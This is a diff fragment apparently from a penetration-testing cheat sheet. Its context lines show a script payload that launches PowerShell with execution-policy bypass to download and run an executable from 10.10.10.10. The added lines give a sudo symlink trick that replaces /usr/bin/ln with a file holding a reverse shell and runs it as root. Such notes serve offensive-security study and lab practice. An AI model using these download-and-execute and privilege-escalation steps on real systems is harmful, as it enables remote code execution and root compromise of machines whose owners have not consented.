@@ -536,3 +536,9 @@ sudo 2to3-2.7 -w -n light.py --output=/root/script
     gg.run('%windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -C "wget http://10.10.10.10/help.exe -outfile C:\\Windows\\Tasks\\gg.exe;C:\\Windows\\Tasks\\gg.exe"' , 0);window.close();
 </script %00 >
 ```
+
+[ln symlink privilege escalation]
+* create malicious bash file containing reverse shell in a writable directory (e.g. /tmp)
+> sudo ln -sf /tmp/ln /usr/bin/ln
+* the file now being redirected to malicious binary
+> sudo /usr/bin/ln
